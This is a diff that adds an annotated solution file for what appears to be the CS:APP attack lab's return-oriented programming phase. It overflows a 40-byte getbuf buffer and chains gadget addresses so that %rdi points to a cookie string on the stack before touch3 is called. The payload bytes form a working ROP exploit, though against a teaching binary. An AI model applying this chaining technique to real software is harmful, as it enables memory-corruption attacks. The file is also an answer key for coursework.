@@ -1,0 +1,59 @@
+/* getbuf function preserves a 40 bytes buffer */
+/* use 40 bytes of ascii number to fill all the buffer */
+    30 31 32 33 34 35 36 37 38 39
+    30 31 32 33 34 35 36 37 38 39
+    30 31 32 33 34 35 36 37 38 39
+    30 31 32 33 34 35 36 37 38 39
+
+/* we may still need these two instructions to set the %rdi register */
+/* 0000000000808bee: movq %rax, %rdi; nop; retq */
+/* 0000000000808bfd: popq %rax; nop; retq */
+
+/* additionally, we need to write in a c-style string as a form of our cookie */
+/* then we need to calculate the relative address of the string in the stack */
+/* then we can use the two gadgets to write the string into the stack */
+
+/* we find a lea instruction to help us with the relative address calculation */
+/* 0000000000808c20 <add_xy>: */
+/*  808c20:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax */
+/*  808c24:	c3                   	retq   */
+
+/* so we should store the offset into %rsi, the stack address into %rdi */
+/* then call the add_xy gadget to get the string address into %rax */
+/* finally we can use the movq %rax, %rdi; nop; retq gadget to set %rdi */
+
+/* we found a instruction to help us set the value of %rdi */
+/* 808c34: 48 89 e0 | c3 -> movq %rsp %rax; retq */
+/* this can help us set the base address of the stack into %rdi */
+    34 8c 80 00 00 00 00 00 /* set the base address of the stack into %rax */
+/* 808bee 48 89 c7 | 90 | c3 -> movq %rax %rdi; nop; retq */
+    ee 8b 80 00 00 00 00 00 /* move %rax into %rdi */
+/* now we should successfully set the stack address (base address) into %rdi */
+
+/* we found some instructions to help us set the value of %rsi */
+/* 808bfd: popq %rax; nop; retq */
+    fd 8b 80 00 00 00 00 00 /* popq %rax; nop; retq */
+/* we can use this to set the offset into %rax */
+    48 00 00 00 00 00 00 00 /* offset +72 (decimal) = 0x48 (hexadecimal) */
+
+/* then we can use a set of instructions to move %rax into %rsi */
+/* 808ccf: 89 c2 | 90 | 90 | c3 -> movl %eax %edx; nop; nop; retq */
+    cf 8c 80 00 00 00 00 00
+/* 808c47: 89 d1 | 90 | c3 -> movl %edx %ecx; nop; retq */
+    47 8c 80 00 00 00 00 00
+/* 808ce9: 89 ce | 90 | 90 | c3 -> movl %ecx %esi; nop; nop; retq */
+    e9 8c 80 00 00 00 00 00
+/* now we should successfully set the offset into %rsi */
+
+/* then we can call the add_xy gadget to get the string address into %rax */
+    20 8c 80 00 00 00 00 00 /* call add_xy gadget */
+
+/* then we should call the movq %rax, %rdi; nop; retq gadget to set %rdi */
+    ee 8b 80 00 00 00 00 00 /* move %rax into %rdi */
+
+/* finally, we should call the touch3 function */
+    43 8b 80 00 00 00 00 00 /* call touch3 function */
+
+/* now we will write the c-style string into the stack */
+/* so our c-style string should be at our origin base + 72 bytes offset */
+    33 63 63 31 31 63 37 37 00 /* "3cc11c77\0", a c-style string */
